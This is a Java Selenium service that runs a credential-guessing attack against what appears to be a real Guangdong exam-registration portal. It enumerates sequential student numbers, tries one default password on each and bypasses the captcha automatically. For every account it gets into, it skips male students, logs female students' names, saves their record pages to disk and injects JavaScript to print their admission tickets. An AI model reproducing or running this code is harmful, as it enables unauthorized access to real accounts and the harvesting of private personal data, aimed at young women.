package demo.clawing.service.impl;

import java.io.IOException;
import java.nio.charset.StandardCharsets;

import org.openqa.selenium.Alert;
import org.openqa.selenium.By;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.NoAlertPresentException;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import at.pojo.bo.XpathBuilderBO;
import demo.autoTestBase.testEvent.pojo.po.TestEvent;
import demo.baseCommon.service.CommonService;
import demo.clawing.service.ClawingStudentService;
import demo.selenium.service.WebDriverService;
import demo.selenium.service.impl.AuxiliaryToolServiceImpl;
import ioHandle.FileUtilCustom;

@Service
public class ClawingStudentServiceImpl extends CommonService implements ClawingStudentService {

	@Autowired
	private FileUtilCustom fileUtil;
	@Autowired
	private WebDriverService webDriverService;
	@Autowired
	private AuxiliaryToolServiceImpl auxTool;
//	@Autowired
//	private JavaScriptService jsUtil;
	
	private String mainUrl = "https://www.eeagd.edu.cn";
	private String loginUrl = mainUrl + "/cr/cgbm/login.jsp";
	private String savePath = "d:/auxiliary/tmp/student";

	private TestEvent buildTestEvent() {
		TestEvent t = new TestEvent();
		t.setEventName("student");
		t.setId(1L);
		return t;
	}

	@Override
	public void claw() {
		TestEvent te = buildTestEvent();
		WebDriver d = webDriverService.buildFireFoxWebDriver();

//		String mainWindow = d.getWindowHandle();

		Long startNum = 10510182L;
		Long numIndex = startNum;
		try {

			for (; numIndex > startNum - 200; numIndex--) {
				System.out.println(numIndex);
				if(login(d, "0" + numIndex, te)) {
					handleData(d, numIndex);
				}
			}

		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (d != null) {
				d.quit();
			}
			System.out.println(numIndex);
		}
	}

	private boolean login(WebDriver d, String username, TestEvent te) {
		d.get(loginUrl);
		XpathBuilderBO x = new XpathBuilderBO();
		By studentNumRadioBy = By.xpath(x.start("input").addAttribute("type", "radio").addAttribute("name", "dlfs")
				.addAttribute("value", "2").getXpath());

		WebElement studentNumRadio = d.findElement(studentNumRadioBy);
		studentNumRadio.click();

		By usernameInputBy = By.xpath(x.start("input").addAttribute("id", "dlksh").getXpath());
		WebElement usernameInput = d.findElement(usernameInputBy);
		usernameInput.clear();
		usernameInput.sendKeys(username);

		By pwdInputBy = By.xpath(x.start("input").addAttribute("id", "pwd").getXpath());
		WebElement pwdInput = d.findElement(pwdInputBy);
		pwdInput.clear();
		pwdInput.sendKeys("123456aa");

		inputVerifyCode(d, te);

		By loginButtonBy = By.xpath(x.start("input").addAttribute("id", "dl").getXpath());
		WebElement loginButton = d.findElement(loginButtonBy);
		loginButton.click();
		
		Alert alert = null;
 		while((alert = tryGetAlert(d)) != null) {
 			if(alert.getText().contains("密码错")) {
 				System.out.println("密码错");
 				alert.accept();
 				return false;
 			} else {
 				alert.accept();
 			}
			inputVerifyCode(d, te);
			loginButton.click();
		}
 		return true;
	}

	private Alert tryGetAlert(WebDriver d) {
		try {
			return d.switchTo().alert();
		} // try
		catch (NoAlertPresentException Ex) {
			return null;
		} // catch
	} // isAlertPresent()

	private void inputVerifyCode(WebDriver d, TestEvent te) {
		XpathBuilderBO x = new XpathBuilderBO();
		
		String vcode = "";
		while(vcode.length() != 4) {
			vcode = getVerifyCode(d, te);
		}

		By verifyCodeInputBy = By.xpath(x.start("input").addAttribute("id", "verifyCode").getXpath());
		WebElement verifyCodeInput = d.findElement(verifyCodeInputBy);
		verifyCodeInput.clear();
		verifyCodeInput.sendKeys(vcode);
		
		while(!isCorrectVerifyCode(d)) {
			vcode = getVerifyCode(d, te);
			while(vcode.length() != 4) {
				vcode = getVerifyCode(d, te);
			}
			verifyCodeInput.clear();
			verifyCodeInput.sendKeys(vcode);
		}
	}
	
	public boolean isCorrectVerifyCode(WebDriver d) {
		try {
			d.findElement(By.xpath(new XpathBuilderBO().start("span").addAttribute("class", "formtips onError").getXpath()));
			return false;
		} catch (Exception e) {
			return true;
		}
	}
	
	private String getVerifyCode(WebDriver d, TestEvent te) {
		XpathBuilderBO x = new XpathBuilderBO();
		By verifyCodeImgBy = By.xpath(x.start("img").addAttribute("id", "yzmimg").getXpath());
		try {
			Thread.sleep(200L);
		} catch (Exception e) {
			// TODO: handle exception
		}
		WebElement verifyCodeImg = d.findElement(verifyCodeImgBy);
		verifyCodeImg.click();
		
		String vcode = null;

		try {
			vcode = auxTool.captchaHandle(d, verifyCodeImg, te);
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		return vcode;
	}

	private void handleData(WebDriver d, Long num) {
		XpathBuilderBO x = new XpathBuilderBO();
		String baseDataTablePath = x.start("table").addAttribute("class", "tlist").getXpath();
		
		String mainTableTbodyPath = x.setXpath(baseDataTablePath).findChild("tbody", 1).getXpath();
		
		String tr1 = x.setXpath(mainTableTbodyPath).findChild("tr", 1).getXpath();

		String tr1td4 = x.setXpath(tr1).findChild("td", 4).getXpath();
		String tr1td2 = x.setXpath(tr1).findChild("td", 2).getXpath();
		
		
		WebElement genderEle = d.findElement(By.xpath(tr1td4));
		if(genderEle.getText().contains("男")) {
			return;
		}
		
		WebElement nameEle = d.findElement(By.xpath(tr1td2));
		String name = nameEle.getText();
		System.out.println(name);
		
		WebElement contentDiv = d.findElement(By.xpath(x.start("div").addAttribute("id", "conten").getXpath()));
		fileUtil.byteToFile(contentDiv.getText().getBytes(StandardCharsets.UTF_8), savePath + "/" + num + ".txt");
		
		x.start("input").addAttribute("type", "button").addAttribute("class", "btn").addAttribute("onclick", "dyzkz();");
		WebElement getAdmissionTicket = d.findElement(By.xpath(x.getXpath()));
		getAdmissionTicket.click();
		
		try {
			Thread.sleep(300L);
		} catch (Exception e) {
		}
		
//		d.get(mainUrl + "/cr/DyzkzServlet");
//		
		JavascriptExecutor jse = (JavascriptExecutor) d;
		String script = null;
		script = "document.getElementById(\"vb_regbutton\").innerHTML = '<input type=\"button\" name=\"rulesubmit\" onclick=\"read();\" style=\"font-size:20px\"  value=\"  打印准考证   \">';";
		jse.executeScript(script);
		
		x.start("input").addAttribute("type", "button").addAttribute("name", "rulesubmit").addAttribute("onclick", "read();");
		WebElement printAdmissionTicket = d.findElement(By.xpath(x.getXpath()));
		printAdmissionTicket.click();
		System.out.println("");
	}
}
